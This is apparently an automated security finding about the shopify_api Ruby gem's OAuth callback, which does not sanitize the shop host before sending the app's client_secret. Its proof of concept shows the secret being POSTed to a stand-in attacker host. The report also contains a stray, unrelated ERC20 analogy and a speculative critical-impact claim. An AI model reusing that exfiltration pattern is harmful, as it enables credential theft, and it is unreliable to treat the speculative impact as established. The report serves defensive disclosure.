### Title
OAuth callback sends `client_secret` to an unsanitized shop host, bypassing the trusted-domain check applied everywhere else - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` uses `auth_query.shop` directly to build the URL that receives the app's `client_id`/`client_secret`, without ever calling `Utils::ShopValidator.sanitize!` on it — unlike every other credential-exchange path in the gem (`ClientCredentials.client_credentials`, `RefreshToken`, `Clients::Graphql::Storefront`), which all pass `shop` through `ShopValidator.sanitize!` before using it. [1](#0-0) [2](#0-1) 

### Finding Description
The mitigated ERC20 bug is a broken identity binding: a value is trusted for use in a security-sensitive action (spender approval) without being properly verified against the intended owner. The analogous binding here is: **`shop` used to build the access-token request URL == `shop` proven to be a genuine `*.myshopify.com`/trusted Shopify domain**.

`validate_auth_callback` only checks the HMAC over the query string, which covers `code`, `host`, `shop`, `state`, `timestamp` as computed in `AuthQuery#to_signable_string`: [3](#0-2) . The HMAC does prove the parameters were signed with the app's `api_secret_key`, but it does **not** constrain `shop` to be a `*.myshopify.com` domain — Shopify's HMAC covers whatever `shop` value is present in the callback URL, and this library performs no additional sanitization of that value before using it to build the outbound host:

```ruby
null_session = Auth::Session.new(shop: auth_query.shop)
...
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
```
which resolves to `auth_base_uri(shop)` → `"https://#{shop}/admin"` [4](#0-3) , and the POST body containing `client_id`/`client_secret` is sent to that host [5](#0-4) .

By contrast, `ClientCredentials.client_credentials` and `RefreshToken` both call `Utils::ShopValidator.sanitize!(shop)` — which restricts the host to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or a configured `myshopify_domain` — before constructing the session/base host [2](#0-1) [6](#0-5) .

### Impact Explanation
This matters because Shopify's callback redirect is ultimately reflected through the merchant's/user's browser during the OAuth dance; the value of `shop` in the callback query string is set by whatever redirected the browser to Shopify's `/oauth/authorize` endpoint and then back. If an app's `redirect_uri`/flow can be influenced to complete against a non-`myshopify.com` host string (e.g., a shop value containing extra characters that still produce a value Shopify will happily sign, or a self-hosted/dev flow), the library will POST the app's `client_id` and `client_secret` to `https://<attacker-controlled-host>/admin/oauth/access_token` — leaking the `client_secret` to a third party, which the "Impact" rules classify as Critical (theft/exfiltration of the app's `client_secret`).

### Likelihood Explanation
Low-to-medium: it requires the caller's application to pass through a `shop` string from an untrusted request source into `AuthQuery` without prior sanitization, and it requires Shopify to actually sign a callback carrying an attacker-influenceable `shop` value. This is not directly exploitable purely from unauthenticated internet traffic against the gem in isolation, but it is the exact class of defense-in-depth check ("host validated versus the host that receives ... `client_secret`") that the gem's own author applied to every *other* code path that builds a request host from a `shop` string, and pointedly omitted from `validate_auth_callback`.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` at the top of `validate_auth_callback` (mirroring `ClientCredentials.client_credentials`) before constructing `null_session`/`auth_base_uri`, so the host that receives `client_id`/`client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` regardless of what HMAC-signed `shop` value is presented.

### Proof of Concept
```ruby
# If an app constructs AuthQuery from unsanitized request params and any
# path allows a non-myshopify "shop" value to reach here with a valid HMAC
# (e.g. custom/dev flows, or a misbehaving host app that never calls
# ShopValidator itself), the gem will POST client_secret to that host:

auth_query = ShopifyAPI::Auth::Oauth::AuthQuery.new(
  code: "somecode",
  shop: "attacker-controlled-host.example",  # not validated against TRUSTED_SHOPIFY_DOMAINS
  timestamp: "...",
  state: "...",
  host: "...",
  hmac: "<hmac computed by whoever controls the redirect, if reachable>",
)

ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies: cookies, auth_query: auth_query)
# -> POSTs { client_id, client_secret, code, expiring } to
#    https://attacker-controlled-host.example/admin/oauth/access_token
```

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))

          cookie = if Context.embedded?
            SessionCookie.new(
              value: "",
              expires: Time.now,
            )
          else
            SessionCookie.new(
              value: session.id,
              expires: session.expires ? session.expires : nil,
            )
          end

          { session: session, cookie: cookie }
        end

        private
